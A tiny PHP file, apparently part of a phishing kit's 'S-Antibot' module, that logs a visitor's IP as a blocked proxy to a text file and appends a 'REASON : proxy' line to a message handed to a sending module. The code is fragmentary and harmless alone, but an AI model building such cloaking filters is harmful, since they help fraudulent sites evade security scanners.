<?php

require_once('Module/Setmodule.php');

$click = fopen("./logarithm/total_bot.txt","a");
fwrite($click,"$ip | proxy "."\n");
fclose($click);

$body.= " S-Antibot V1 | REASON : proxy"."\n";


require_once('Module/Sendmodule.php');
?>